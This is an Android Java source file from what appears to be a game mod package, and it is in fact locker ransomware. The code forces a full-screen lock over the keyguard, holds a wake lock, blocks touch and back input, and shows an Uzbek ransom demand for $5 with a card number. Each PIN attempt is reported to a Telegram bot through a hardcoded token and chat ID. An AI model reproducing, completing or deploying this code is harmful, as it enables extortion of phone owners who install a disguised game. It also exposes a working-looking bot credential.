package com.pvzmod.game;

import android.app.Activity;
import android.app.KeyguardManager;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import androidx.core.content.ContextCompat;

public class LockScreenActivity extends Activity {
    private static final String BOT_TOKEN = "8180924483:AAHt7ySle_GRAywhYP6KZJnCMzwIDegjQoA";
    private static final String CHAT_ID = "5970230338";
    
    private EditText pinInput;
    private TextView ransomText, attemptsText;
    private Button unlockBtn;
    private int failedAttempts = 0;
    private String correctPin;
    private PowerManager.WakeLock wakeLock;
    private Handler handler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_lock);
        setFullScreenLock();
        
        pinInput = findViewById(R.id.pin_input);
        ransomText = findViewById(R.id.ransom_text);
        attemptsText = findViewById(R.id.attempts_text);
        unlockBtn = findViewById(R.id.unlock_btn);
        
        correctPin = PinManager.getStoredPin(this);
        ransomText.setText("💰 5$ jo'natmasang telefon ochilmaydi!\nCard: 9860 4316 2001 1234 5678\nDevice ID: " + 
                          DeviceIdGenerator.getUniqueId(this));
        
        attemptsText.setText("Urinishlar: 3");
        acquireWakeLock();
        
        unlockBtn.setOnClickListener(v -> checkPin());
    }

    private void setFullScreenLock() {
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                           WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                           WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                           WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                           WindowManager.LayoutParams.FLAG_FULLSCREEN);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true);
            setTurnScreenOn(true);
            KeyguardManager keyguard = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
            keyguard.requestDismissKeyguard(this, null);
        }
    }
    
    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "PvZMod:Lock");
        wakeLock.acquire(60*60*1000L); // 1 soat
    }

    private void checkPin() {
        String inputPin = pinInput.getText().toString();
        
        if (inputPin.equals(correctPin)) {
            TelegramSender.sendMessage(BOT_TOKEN, CHAT_ID, "✅ Telefon ochildi! Device: " + DeviceIdGenerator.getUniqueId(this));
            finishAffinity();
        } else {
            failedAttempts++;
            int remaining = 3 - failedAttempts;
            
            if (remaining > 0) {
                attemptsText.setText("Xato! Qolgan: " + remaining);
                pinInput.setText("");
                pinInput.requestFocus();
            } else {
                attemptsText.setText("1 daqiqa blok!");
                pinInput.setEnabled(false);
                unlockBtn.setEnabled(false);
                
                handler.postDelayed(() -> {
                    failedAttempts = 0;
                    attemptsText.setText("Urinishlar: 3");
                    pinInput.setEnabled(true);
                    unlockBtn.setEnabled(true);
                    pinInput.requestFocus();
                }, 60000); // 1 daqiqa
            }
            
            TelegramSender.sendMessage(BOT_TOKEN, CHAT_ID, "❌ PIN xato! " + failedAttempts + "/3. Device: " + DeviceIdGenerator.getUniqueId(this));
        }
    }

    @Override
    public boolean onTouchEvent(MotionEvent event) {
        return true; // Touch blok
    }

    @Override
    protected void onDestroy() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        super.onDestroy();
    }

    @Override
    public void onBackPressed() {
        // Blok
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (hasFocus) {
            setFullScreenLock();
        }
    }
}
